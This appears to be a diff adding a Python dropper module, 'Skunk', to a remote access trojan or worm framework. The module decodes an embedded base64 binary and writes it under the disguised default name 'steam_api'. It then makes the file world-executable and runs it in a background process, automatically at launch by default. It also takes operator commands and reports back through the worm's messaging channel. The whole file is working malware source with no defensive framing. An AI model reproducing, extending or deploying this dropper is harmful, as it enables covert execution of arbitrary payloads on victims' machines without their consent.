@@ -1,0 +1,91 @@
+#!name##Skunk
+#!types##module
+#!info##Execute binary payload. Add only binary payload
+#!reqVar##SNK_fname##Name for binary process##str
+#!setVar##SNK_fname##steam_api##str
+#!reqVar##SNK_auto##Immediate start of payload after launch.##str
+#!setVar##SNK_auto##True##str
+#!reqPayload##SKN_bin##Binary Payload
+#!payStep##load_binary
+#!payStep##encode_bin64
+
+
+import os
+import multiprocessing
+import subprocess
+import base64
+
+
+class SKN_Payload:
+    def __init__(self):
+        self.payload = {{SKN_bin}}
+        self.name = "{{SNK_fname}}"
+        self.fpath = None
+    
+    def payload_return(self) -> bytes:
+        return base64.b64decode(self.payload)
+    
+    def write(self, fpath: str = None) -> bool:
+        if not fpath:
+            fpath = os.path.join(os.getcwd(), self.name)
+        try:
+            with open(fpath, "wb") as file:
+                file.write(self.payload_return())
+            self.fpath = fpath
+        except Exception as e:
+            return False
+        try:
+            os.chmod(fpath, 0o777)
+            return True
+        except:
+            return False
+    
+    def _execute(self) -> None:
+        try:
+            exe = subprocess.run(self.fpath, shell=True)
+        except:
+            pass
+        
+    def execute(self) -> None:
+        if not self.fpath:
+            if not self.write():
+                return
+        exe = multiprocessing.Process(target=self._execute)
+        exe.start()
+    
+
+
+class Skunk:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.payload = SKN_Payload()
+        self.autos = "{{SNK_auto}}"
+        if self.autos == "False" or self.autos == False:
+            self.autos = False
+        
+
+    def help(self) -> str:
+        h = "'SNK_write [optional: file_path]' - Decode and write payload to specific path.\n"
+        h += "'SNK_exe' - Execute payload. First must be written.\n"
+        h += "'SNK_fpath' - Show payload file path if exists\n"
+        return h
+    
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
+            case "SNK_write":
+                if len(cmd) > 1:
+                    self.payload.write(cmd[1])
+                else:
+                    self.payload.write()
+            case "SNK_exe":
+                self.payload.execute()
+            case "SNK_fpath":
+                self.worm.send_msg(f"Payload file path: {str(self.payload.fpath)}")
+
+
+    def start(self) -> None:
+        if self.autos:
+            self.payload.write()
+            self.payload.execute()
+
